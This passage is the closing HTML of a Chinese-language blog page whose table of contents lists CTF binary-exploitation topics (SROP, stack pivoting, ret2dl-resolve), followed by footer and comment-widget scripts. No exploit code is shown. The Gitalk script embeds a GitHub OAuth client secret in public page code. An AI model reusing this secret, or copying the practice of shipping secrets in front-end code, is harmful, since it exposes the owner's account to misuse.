class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-number">4.1.1.</span> <span class="toc-text">Linux系统调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#signal%E6%9C%BA%E5%88%B6"><span class="toc-number">4.1.2.</span> <span class="toc-text">signal机制</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwntools-srop%E6%A8%A1%E5%9D%97"><span class="toc-number">4.2.</span> <span class="toc-text">pwntools srop模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Backdoor-CTF2017-Fun-Signals"><span class="toc-number">4.3.</span> <span class="toc-text">Backdoor CTF2017: Fun Signals</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stack-pivoting"><span class="toc-number">5.</span> <span class="toc-text">stack pivoting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pivot32"><span class="toc-number">5.1.</span> <span class="toc-text">pivot32</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GreHack-CTF2017-beerfighter"><span class="toc-number">5.2.</span> <span class="toc-text">GreHack CTF2017: beerfighter</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2dl-resolve"><span class="toc-number">6.</span> <span class="toc-text">ret2dl-resolve</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2dl-resolve%E5%8E%9F%E7%90%86"><span class="toc-number">6.1.</span> <span class="toc-text">ret2dl-resolve原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E7%A7%8D%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF"><span class="toc-number">6.2.</span> <span class="toc-text">2种攻击场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XDCTF-2015-pwn200"><span class="toc-number">6.3.</span> <span class="toc-text">XDCTF 2015:  pwn200</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By zsky</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function addGitalkSource () {
  const ele = document.createElement('link')
  ele.rel = 'stylesheet'
  ele.href= 'https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css'
  document.getElementsByTagName('head')[0].appendChild(ele)
}

function loadGitalk () {
  function initGitalk () {
    var gitalk = new Gitalk(Object.assign({
      clientID: 'e2ad1e02c5234921e4ca',
      clientSecret: '5b3decb222a8aed9f74426b2d5a9136ec0a6ce46',
      repo: 'zzzzsky.github.io',
      owner: 'zzzzsky',
      admin: ['zzzzsky'],
      id: '3602873270c689b93858835b5ae47d00',
      language: 'zh-CN',
      perPage: 10,
      distractionFreeMode: false,
      pagerDirection: 'last',
      createIssueManually: true,
      updateCountCallback: commentCount
    },null))

    gitalk.render('gitalk-container')
  }

  if (typeof Gitalk === 'function') initGitalk()
  else {
    addGitalkSource()
    getScript('https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js').then(initGitalk)
  }
}

function commentCount(n){
  let isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
  if (isCommentCount) {
    isCommentCount.innerHTML= n
  }
}

if ('Gitalk' === 'Gitalk' || !false) {
  if (false) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
  else loadGitalk()
} else {
  function loadOtherComment () {
    loadGitalk()
  }
}</script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>